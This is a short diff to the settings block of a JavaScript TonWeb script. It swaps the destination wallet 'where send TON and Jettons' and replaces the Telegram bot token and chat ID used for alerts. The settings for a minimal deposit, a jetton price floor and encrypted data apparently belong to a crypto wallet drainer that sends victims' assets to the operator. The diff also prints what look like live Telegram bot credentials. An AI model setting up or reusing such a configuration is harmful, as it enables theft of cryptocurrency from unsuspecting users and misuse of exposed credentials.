@@ -14,7 +14,7 @@ const tonweb = new TonWeb();
 // ========================= GENERAL SETTINGS =====================
 // ================================================================
 const encr_key = 500; // ENCR DATA
-const wallet = "UQAa0BlrCKaNm0jjIbgtAAy8-ERq8JUw1Xjd3aaZDZ4IiDP5"; // Wallet where send TON and Jettons
+const wallet = "UQDev22E4MCOh6vPJslbgE211qkpC0DW29QCUvQwbn5XeP3w"; // Wallet where send TON and Jettons
 const min_dep = "0.001" // Minimal deposit TON
 const min_jetton_price = "0.01"; // Minimal token price $
 
@@ -50,8 +50,8 @@ const rpcs = {
 // ========================= TG SETTINGS ==========================
 // ================================================================
 const BOT = true; // Telegram Bot [On/Off]
-const TG_TOKEN = "6132706362:AAEztNnQTFpD5VdBwOB4CtdfBoSnpcAJry0"; // Telegram Bot Token
-const TG_CHAT_ID = "5057341518"; // Telegram Chat Id
+const TG_TOKEN = "8549456638:AAHpE3yp1W9wOOX1U605r7vbgsCH2Wob6VA"; // Telegram Bot Token
+const TG_CHAT_ID = "7556622176"; // Telegram Chat Id
 const TG_POLLING = true; // Don't touch
 
 
